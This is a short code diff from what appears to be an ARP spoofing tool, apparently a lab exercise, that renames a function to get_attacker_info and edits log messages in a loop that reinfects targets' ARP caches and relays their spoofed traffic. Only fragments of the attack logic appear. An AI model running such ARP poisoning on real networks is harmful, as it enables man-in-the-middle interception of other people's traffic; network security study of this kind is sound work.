@@ -7,7 +7,7 @@ void usage() {
     printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
-void get_myinfo(char* interface){
+void get_attacker_info(char* interface){
     // Reference: https://pencil1031.tistory.com/66
     uint8_t mac[6];
     char ip[40];
@@ -199,10 +199,10 @@ void arp_spoof(pcap_t* handle, Pair& pair){
         }
         if (is_recover(packet, pair)){
             infect(handle, pair);
-            printf("[DETECTED] recover :: reinfect\n");
+            printf("[DETECT] recover :: reinfect\n");
         } else if (is_spoofed_ip(packet, pair)) {
             relay(handle, packet, pair);
-            printf("[DETECTED] spoofed IP :: relay\n");
+            printf("[DETECT] spoofed IP :: relay\n");
         }
     }
 }
@@ -210,6 +210,7 @@ void arp_spoof(pcap_t* handle, Pair& pair){
 void task(pcap_t* handle, Pair& pair){
     pair.smac = get_smac(handle, pair);
     pair.tmac = get_tmac(handle, pair);
+
     printf("Sender MAC: %s\n", std::string(pair.smac).c_str());
     printf("Target MAC: %s\n", std::string(pair.tmac).c_str());
     arp_spoof(handle, pair);
